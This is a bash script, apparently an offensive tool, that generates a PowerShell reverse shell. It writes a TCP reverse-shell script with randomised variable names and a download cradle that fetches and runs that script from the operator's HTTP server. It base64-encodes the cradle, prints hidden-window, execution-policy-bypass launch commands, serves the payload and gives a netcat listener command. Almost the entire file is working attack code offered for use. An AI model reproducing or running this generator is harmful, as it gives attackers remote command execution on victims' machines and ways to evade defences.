#!/bin/bash

# ============================================
#        POWERSHELL PAYLOAD GENERATOR
# ============================================

# Color codes
BOLD="\033[1m"
RED="\033[31m"
GREEN="\033[32m"
YELLOW="\033[33m"
BLUE="\033[34m"
MAGENTA="\033[35m"
CYAN="\033[36m"
RESET="\033[0m"

# ============================================
#                FUNCTIONS
# ============================================

# Cleanup function for Ctrl+C
cleanup() {
    echo -e "\n${RED}[!]${RESET} Interrupt detected. Cleaning up..."
    rm -f touch.ps1 cradle payload.txt 2>/dev/null
    echo -e "${GREEN}[+]${RESET} Temporary files removed"
    exit 0
}

# Trap Ctrl+C
trap cleanup SIGINT

# Display help
show_help() {
    echo -e "${BOLD}${CYAN}PowerShell Payload Generator${RESET}"
    echo -e "${BLUE}====================================${RESET}\n"
    echo -e "${BOLD}USAGE:${RESET}"
    echo -e "  $0 [OPTIONS]\n"
    echo -e "${BOLD}OPTIONS:${RESET}"
    echo -e "  --lhost IP       Listener IP address (required)"
    echo -e "  --lport PORT     Listener port (required)"
    echo -e "  --sport PORT     HTTP server port (required)"
    echo -e "  -h, --help       Show this help message\n"
    echo -e "${BOLD}EXAMPLES:${RESET}"
    echo -e "  $0 --lhost 10.10.10.10 --lport 443 --sport 8080"
    echo -e "  $0 --lhost 192.168.1.100 --lport 4444 --sport 8000\n"
    echo -e "${BOLD}NOTES:${RESET}"
    echo -e "  • Use Ctrl+C to stop the server and cleanup"
    echo -e "  • Start listener: ${GREEN}rlwrap nc -lvnp <LPORT>${RESET}"
    echo -e "  • Files created: ${YELLOW}touch.ps1, cradle, payload.txt${RESET}"
    exit 0
}

# Parse arguments
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            --lhost)
                LHOST="$2"
                shift 2
                ;;
            --lport)
                LPORT="$2"
                shift 2
                ;;
            --sport)
                SPORT="$2"
                shift 2
                ;;
            -h|--help)
                show_help
                ;;
            *)
                echo -e "${RED}[!]${RESET} Unknown option: $1"
                show_help
                ;;
        esac
    done
}

# Validate arguments
validate_args() {
    if [ -z "$LHOST" ] || [ -z "$LPORT" ] || [ -z "$SPORT" ]; then
        echo -e "${RED}[!]${RESET} Missing required arguments!\n"
        show_help
    fi
    
    # Validate IP format (basic check)
    if ! [[ $LHOST =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${RED}[!]${RESET} Invalid IP address: $LHOST"
        exit 1
    fi
    
    # Validate ports
    if ! [[ $LPORT =~ ^[0-9]+$ ]] || [ $LPORT -lt 1 ] || [ $LPORT -gt 65535 ]; then
        echo -e "${RED}[!]${RESET} Invalid listener port: $LPORT"
        exit 1
    fi
    
    if ! [[ $SPORT =~ ^[0-9]+$ ]] || [ $SPORT -lt 1 ] || [ $SPORT -gt 65535 ]; then
        echo -e "${RED}[!]${RESET} Invalid server port: $SPORT"
        exit 1
    fi
}

# Generate random variable name
randvar() {
    cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1
}

# Display banner
show_banner() {
    clear
    echo -e "${BOLD}${MAGENTA}"
    echo "╔══════════════════════════════════════════════════════╗"
    echo "║     POWER SHELL REVERSE SHELL GENERATOR              ║"
    echo "║                   v1.0                               ║"
    echo "╚══════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

# ============================================
#                MAIN SCRIPT
# ============================================

# Parse command line arguments
parse_args "$@"

# Show banner
show_banner

# Validate arguments
validate_args
# Display configuration
echo -e "${BLUE}[*]${RESET} Configuration:"
echo -e "    ${CYAN}Listener IP:${RESET}   $LHOST"
echo -e "    ${CYAN}Listener Port:${RESET} $LPORT"
echo -e "    ${CYAN}Server Port:${RESET}   $SPORT"
echo -e "    ${CYAN}Server URL:${RESET}    http://$LHOST:$SPORT/touch.ps1"
echo ""

# Generate random variable names
echo -e "${GREEN}[+]${RESET} Generating random variable names..."
v1=$(randvar); v2=$(randvar); v3=$(randvar); v4=$(randvar)
v5=$(randvar); v6=$(randvar); v7=$(randvar); v8=$(randvar)

# Create reverse shell payload
echo -e "${GREEN}[+]${RESET} Creating PowerShell reverse shell..."
cat > touch.ps1 << EOF
\$$v1=New-Object System.Net.Sockets.TCPClient("$LHOST",$LPORT)
\$$v2=\$$v1.GetStream()
[byte[]]\$$v3=0..65535|%{0}
while((\$$v4=\$$v2.Read(\$$v3,0,\$$v3.Length)) -ne 0){
    \$$v5=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$$v3,0,\$$v4)
    \$$v6=(iex \$\$$v5 2>&1 | Out-String)
    \$$v7=\$$v6+"[>] "
    \$$v8=([text.encoding]::ASCII).GetBytes(\$$v7)
    \$$v2.Write(\$$v8,0,\$$v8.Length)
    \$$v2.Flush()
}
\$$v1.Close()
EOF

# Create download cradle
echo -e "${GREEN}[+]${RESET} Creating download cradle..."
cat > cradle << EOF
IEX(New-Object Net.WebClient).downloadString('http://$LHOST:$SPORT/touch.ps1')
EOF

# Encode to Base64
echo -e "${GREEN}[+]${RESET} Encoding payload..."
payload=$(cat cradle | iconv -t utf-16le | base64 -w0)

# Save payloads to file
echo -e "${GREEN}[+]${RESET} Saving payloads to payload.txt..."
cat > payload.txt << EOF
# ============================================
#   POWERSHELL REVERSE SHELL PAYLOADS
# ============================================
# Generated: $(date)
# Listener: $LHOST:$LPORT
# ============================================

# Option 1: Basic encoded command
powershell -enc $payload

# Option 2: Stealth mode
powershell -NoP -sta -NonI -W Hidden -Exec Bypass -Enc $payload

# Option 3: With encoded command flag
powershell -NoP -sta -NonI -W Hidden -encodedCommand $payload

# Option 4: One-liner for cmd.exe
cmd.exe /c "powershell -enc $payload"

# ============================================
#   DIRECT DOWNLOAD COMMAND (if needed)
# ============================================
IEX(New-Object Net.WebClient).downloadString('http://$LHOST:$SPORT/touch.ps1')
EOF

# Display generated payloads
echo -e "\n${BOLD}${CYAN}════════════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}${YELLOW}                    GENERATED PAYLOADS                    ${RESET}"
echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════${RESET}\n"
echo -e "${GREEN}[+]${RESET} ${BOLD}Basic Encoded Command:${RESET}"
echo -e "${BLUE}+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${RESET}"
echo -e "powershell -enc $payload\n"
echo -e "${GREEN}[+]${RESET} ${BOLD}Stealth Mode:${RESET}"
echo -e "${BLUE}+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${RESET}"
echo -e "powershell -NoP -sta -NonI -W Hidden -Exec Bypass -Enc $payload\n"
echo -e "${GREEN}[+]${RESET} ${BOLD}Listener Command:${RESET}"
echo -e "${BLUE}+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++${RESET}"
echo -e "rlwrap nc -lvnp $LPORT\n"

echo -e "${BOLD}${YELLOW}[!]${RESET} Payloads saved to ${GREEN}payload.txt${RESET}"
echo -e "${BOLD}${YELLOW}[!]${RESET} Press ${RED}Ctrl+C${RESET} to stop server and cleanup"
# Start HTTP server
echo -e "\n${BOLD}${CYAN}════════════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}${GREEN}                    STARTING SERVER                       ${RESET}"
echo -e "${BOLD}${CYAN}════════════════════════════════════════════════════════${RESET}\n"
echo -e "${GREEN}[*]${RESET} Starting HTTP server on port $SPORT..."
echo -e "${GREEN}[*]${RESET} Serving: http://$LHOST:$SPORT/touch.ps1"
echo -e "${GREEN}[*]${RESET} Use Ctrl+C to stop\n"

# Check if root for sudo
if [ "$EUID" -eq 0 ]; then
    python3 -m http.server "$SPORT"
else
    echo -e "${YELLOW}[*]${RESET} Running with sudo..."
    sudo python3 -m http.server "$SPORT"
fi

# Cleanup after server stops
echo -e "\n${GREEN}[+]${RESET} Server stopped. Cleaning up..."
rm -f touch.ps1 cradle payload.txt 2>/dev/null
echo -e "${GREEN}[+]${RESET} Cleanup completed. Goodbye!"
